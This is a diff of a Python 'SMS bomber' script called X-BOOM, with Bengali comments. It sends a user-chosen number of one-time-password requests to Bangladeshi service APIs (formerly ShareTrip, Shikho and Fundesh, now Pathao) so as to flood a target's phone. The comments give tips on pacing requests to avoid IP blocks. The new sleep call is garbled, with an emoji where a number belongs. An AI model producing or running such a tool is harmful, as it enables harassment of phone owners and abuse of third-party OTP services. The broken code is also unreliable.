@@ -1,57 +1,50 @@
-import requests
-import os
-import time
-import random
-
-# কালার কোড (টারমাক্স সুন্দর দেখানোর জন্য)
-r = "\033[1;31m"
-g = "\033[1;32m"
-y = "\033[1;33m"
-w = "\033[1;37m"
+import requests, os, time
 
 def banner():
     os.system('clear')
-    print(f"{g}========================================")
-    print(f"{y}        X-BOOM ULTIMATE EDITION         ")
-    print(f"{y}     Bypass: Enabled | WiFi & PC        ")
-    print(f"{g}========================================{w}")
+    print("========================================")
+    print("        X-BOOM VIP BYPASS (2026)        ")
+    print("========================================")
 
 def send_sms(target, count):
-    # সচল এবং শক্তিশালী API লিস্ট
-    apis = [
-        {"url": "https://api.sharetrip.net/api/v1/otp/send", "data": {"mobileNumber": target, "type": "login"}},
-        {"url": "https://api.shikho.com/api/v1/auth/send-otp", "data": {"phone": target, "type": "login"}},
-        {"url": "https://api.fundesh.com.bd/api/auth/send-otp", "data": {"phoneNumber": target, "service": "LOGIN"}}
-    ]
+    # Pathao New API (এটি খুব একটা ব্লক হয় না)
+    url = "https://api-hermes.pathao.com/user/otp-send/login"
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
-        "Content-Type": "application/json"
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A505F)",
+        "Content-Type": "application/json",
+        "Accept": "application/json"
     }
+    
+    # নম্বরের আগে ৮৮ যোগ করা (পাঠাও এর জন্য জরুরি)
+    phone = "+88" + target
 
-    print(f"\n{g}[+] Attack Started on: {target}{w}")
+    print(f"\n[+] Global Attack started on: {target}")
     for i in range(count):
-        api = random.choice(apis)
         try:
-            # রিকোয়েস্ট পাঠানো
-            res = requests.post(api["url"], json=api["data"], headers=headers, timeout=10)
-            if res.status_code == 200:
-                print(f"{g}[!] SMS {i+1} Sent Successfully!{w}")
+            # POST Request
+            res = requests.post(url, json={"phone": phone}, headers=headers)
+            
+            # সার্ভারের উত্তর চেক করা
+            if res.status_code == 200 or res.status_code == 201:
+                print(f"[!] SMS {i+1} Sent Successfully!")
             else:
-                print(f"{r}[?] SMS {i+1} Failed (Blocked){w}")
+                # যদি এখানে Failed দেখায়, বুঝবেন আপনার IP ব্লক
+                print(f"[?] SMS {i+1} Failed - Code: {res.status_code}")
         except:
-            print(f"{r}[-] Connection Error{w}")
+            print(f"[-] Network Error at SMS {i+1}")
         
-        time.sleep(5) # ৫-৭ সেকেন্ড গ্যাপ জরুরি
+        time.sleep(😎 # একটু বেশি গ্যাপ দিলে ব্লক হওয়ার ভয় থাকে না
 
 def main():
     banner()
-    num = input(f"{y}Enter Number: {w}")
-    amount = int(input(f"{y}Enter Amount: {w}"))
-    send_sms(num, amount)
+    number = input("Enter Phone (01xxxxxxxxx): ")
+    amount = int(input("Amount: "))
+    send_sms(number, amount)
 
 if __name__ == "__main__":
     main()
+
 
   
 
